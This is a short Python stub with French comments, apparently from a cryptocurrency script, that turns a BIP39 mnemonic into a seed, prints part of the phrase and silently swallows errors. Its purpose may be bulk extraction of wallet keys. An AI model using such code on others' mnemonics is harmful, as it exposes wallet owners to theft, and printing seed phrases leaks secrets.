# ====================== HELPER FUNCTIONS (FUTURE SCRIPT) ======================
def extract_full_keys_from_mnemonic(mnemonic: str, line_info=""):
    """Fonction autonome pour extraire tout si besoin"""
    try:
        seed_bytes = Bip39SeedGenerator(mnemonic).Generate()
        print(f"\n[FUTURE] Deep extraction on mnemonic -> {mnemonic[:30]}...")
        # Tu peux coller ici le même code de dérivation BTC/ETH que ci-dessus si tu veux une fonction séparée
    except:
        pass
